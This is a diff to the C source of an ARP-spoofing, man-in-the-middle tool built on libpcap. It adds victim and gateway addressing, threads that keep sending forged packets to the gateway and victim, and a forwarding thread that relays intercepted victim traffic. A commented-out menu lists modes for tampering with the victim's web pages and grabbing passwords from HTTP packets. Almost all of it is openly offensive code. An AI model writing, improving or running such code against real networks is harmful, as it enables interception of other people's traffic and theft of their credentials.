@@ -1,6 +1,13 @@
 #include "HUAJI_head.h"
 #include <pthread.h>
 
+u_char TARGET_MAC[6]; //victim's mac
+u_char ATTACKER_MAC[6]; //attacker's mac
+u_char GATEWAY_MAC[6]; //gateway's mac
+u_char TARGET_IP[4]; //victim's ip
+u_char GATEWAY_IP[4] = {192,168,1,1}; //gateway's ip
+int choose; //mode choose
+
 /* about more thread */
 struct arg1 {
     pcap_t *handle;
@@ -8,27 +15,29 @@ struct arg1 {
     int size;
 } tar_arg, gate_arg;
 
+struct arg2 {
+    pcap_t *handle;
+    u_char *packet;
+    struct pcap_pkthdr *pkthdr;
+    int size;
+} forward_arg;
+
 void *retval;
 pthread_t thread1, thread2, thread3;
 int ret_thread1, ret_thread2, ret_thread3;
 /* end */
 
 void *startG(void *arg) {
-    int i = 0;
-    struct arg1 *real_arg;
-    real_arg = (struct arg1 *)arg;
+    struct arg1 *real_arg = (struct arg1 *)arg;
     while (1) {
         pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
-        printf("Packet %d was sent to Gateway\n", ++i);
         sleep(2);
     }
     pthread_exit(NULL);
 }
 
 void *startV(void *arg) {
-    int i = 0;
-    struct arg1 *real_arg;
-    real_arg = (struct arg1 *)arg;
+    struct arg1 *real_arg = (struct arg1 *)arg;
     while (1) {
         pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
         sleep(1);
@@ -36,11 +45,17 @@ void *startV(void *arg) {
     pthread_exit(NULL);
 }
 
-u_char TARGET_MAC[6]; //victim's mac
-u_char ATTACKER_MAC[6]; //attacker's mac
-u_char GATEWAY_MAC[6]; //gateway's mac
-u_char TARGET_IP[4]; //victim's ip
-u_char GATEWAY_IP[4] = {192,168,1,1}; //gateway's ip
+void *startF(void *arg) {
+    struct arg2 *real_arg =(struct arg2 *)arg;
+    ethernet_header *pEther = (ethernet_header *)real_arg->packet;
+    ip_header *pIpv4 = (ip_header *)pEther->data;
+    tcp_header *pTcp = (tcp_header *)pIpv4->data;
+    if (!strncmp(pEther->SRC_mac, TARGET_MAC, 6) && !strncmp(pEther->DST_mac, ATTACKER_MAC, 6)) {
+        memcpy(pEther->DST_mac, GATEWAY_MAC, 6);
+        pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
+    }
+
+}
 
 /* get gatway's mac */
 void getgateway(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet) {
@@ -166,9 +181,10 @@ int main(int argc, char const *argv[]) {
     ret_thread2 = pthread_create(&thread2, NULL, (void *)startV, (void *)&tar_arg);
 
     /* next step */
-    /*printf("Please wait\n");
+    /*struct pcap_pkthdr *pkt_header;
+    u_char *pkt_data;
+    printf("Please wait\n");
     sleep(2);
-    int choose;
     printf("Now your victim's network has been broken !\n");
     printf("If you want to do something interesting, you can enter a number to choose mode.\n");
     printf("\t1: Just \"repair\" his network\n");
@@ -176,9 +192,14 @@ int main(int argc, char const *argv[]) {
     printf("\t3: Change all the picture in his web page to HUAJI.\n");
     printf("\t4: Get his passward in http packet.\n");
     scanf(" %d", &choose);
-    switch (choose) {
-        case 1: {
-            
+    while (1) {
+        if (pcap_next_ex(handle, &pkt_header, &pkt_data)) {
+            pthread_t new_thread;
+            forward_arg.handle = handle;
+            forward_arg.packet = pkt_data;
+            forward_arg.pkthdr = pkt_header;
+            forward_arg.size = sizeof(pkt_data);
+            pthread_create(&new_thread, NULL, (void *)startF, (void *)&forward_arg);
         }
     }*/
     /* before end */
